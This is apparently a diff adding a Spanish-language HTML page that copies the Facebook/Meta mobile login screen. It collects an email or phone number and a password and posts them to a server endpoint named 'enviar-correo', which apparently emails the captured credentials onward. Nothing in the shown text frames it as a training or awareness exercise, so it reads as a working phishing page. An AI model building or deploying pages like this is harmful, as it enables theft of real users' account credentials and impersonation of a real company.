@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body, html {
+            height: 100%;
+            font-family: Arial, sans-serif;
+            background-color: #fff;
+        }
+
+        .container {
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .top-bar {
+            color: #1877f2;
+            font-size: 14px;
+            margin-top: 10px;
+        }
+
+        .logo {
+            display: block;
+            margin: auto;
+            width: 48px;
+            right: 48px;
+        }
+
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            max-width: 400px;
+            padding: 14px;
+            margin: 8px 0;
+            font-size: 16px;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+        }
+
+        .login-btn {
+            width: 100%;
+            max-width: 400px;
+            padding: 14px;
+            background-color: #1877f2;
+            color: white;
+            font-size: 16px;
+            border: none;
+            border-radius: 25px;
+            margin-top: 10px;
+            cursor: pointer;
+        }
+
+        .login-btn:hover {
+            background-color: #145dbf;
+        }
+
+        .link {
+            display: block;
+            margin: 15px 0;
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+            text-align: center
+        }
+
+        .create-btn {
+            width: 100%;
+            max-width: 400px;
+            padding: 14px;
+            background-color: white;
+            color: #1877f2;
+            font-size: 16px;
+            border: 1px solid #1877f2;
+            border-radius: 25px;
+            margin-top: auto;
+            margin-bottom: 20px;
+            cursor: pointer;
+        }
+
+        .meta-logo {
+            font-weight: bold;
+            color: #606770;
+            margin-bottom: 8px;
+        }
+
+        .footer {
+            font-size: 12px;
+            color: #999;
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="top-bar">Español</div><br><br>
+
+        <form action="http://localhost:3000/enviar-correo" method="post">
+            <div><img class="logo" src="logo.png" alt=""></div>
+
+            <input type="text" name="nombre" placeholder="Correo electrónico o número de teléfono"><br>
+            
+            <input type="password" name="Contraseña" placeholder="Contraseña"><br>
+
+            <input class="login-btn" type="submit" value="Iniciar sesión">
+
+            <a class="link">¿Olvidaste tu contraseña?</a>
+
+            <input class="create-btn" type="submit" value="Crear cuenta nueva">
+        </form>
+        <div class="meta-logo">Meta</div>
+        <div class="footer">Información &nbsp; Ayuda &nbsp; Más</div>
+    </div>
+
+</body>
+</html>
